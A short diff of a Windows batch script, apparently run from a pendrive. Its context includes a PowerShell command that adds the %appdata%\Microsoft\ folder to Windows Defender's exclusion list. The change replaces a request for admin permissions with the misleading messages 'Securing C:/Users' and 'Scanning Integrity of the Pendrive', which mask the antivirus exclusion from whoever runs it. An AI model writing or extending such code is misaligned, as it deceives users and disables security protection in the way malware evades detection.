@@ -40,7 +40,11 @@ IF NOT exist "G:\python\General\appdev\randomiser.py" (
     timeout 5 >nul
     exit
 ) ELSE (
-    echo Provide Admin Permissions now.
+    echo Securing C:/Users
     powershell -command Add-MpPreference -ExclusionPath %appdata%\Microsoft\
+    timeout 1 >nul
+    echo;
+    echo Scanning Integrity of the Pendrive
+    
 )
 pause
